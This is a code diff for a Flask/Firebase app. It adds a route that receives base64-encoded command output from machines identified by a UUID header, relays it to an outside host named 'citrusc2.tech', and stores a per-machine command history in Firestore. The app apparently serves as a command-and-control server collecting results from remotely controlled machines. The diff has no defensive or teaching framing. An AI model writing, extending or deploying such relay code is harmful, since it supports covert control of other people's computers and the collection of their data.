@@ -4,8 +4,10 @@ import firebase_admin
 from firebase_admin import credentials, firestore
 
 import uuid
+from datetime import datetime
 
 from . import routes
+import requests
 
 # from twilio.rest import Client
 
@@ -129,3 +131,32 @@ def stats():
 
     return res
 
+@routes.route('/cmdout/<string:input_encoding>', methods=['POST', 'GET']) 
+def cmdoutput(input_encoding):
+    #l = request.form.keys()
+    #output = ""
+    #output = output.join(l)
+    #print(dict(request.headers))
+    padding_to_readd = int(input_encoding[-1])
+    input_encoding = input_encoding + ("=" * padding_to_readd)
+    base64_bytes = input_encoding.encode('ascii')
+    message_bytes = base64.b64decode(base64_bytes)
+    message = message_bytes.decode('ascii')
+    #print("CMDOUTPUT: " + message)
+    r = requests.post('http://citrusc2.tech/out', data={'output': message, 'uuid': request.headers['Uuid']})
+
+
+    machines = db.collection('machines').where(
+        'uuid', '==', request.headers.get('Uuid')).limit(1).get()
+    
+    if not machines:
+        db.collection('cmd_hist').add({
+            'uuid': request.headers['Uuid'],
+            'history': [message]
+        })
+    else:
+        machine = machines[0]
+        history = machine.to_dict()['history']
+        history.append(message)
+        machine.reference.update({'history': history})
+    return message
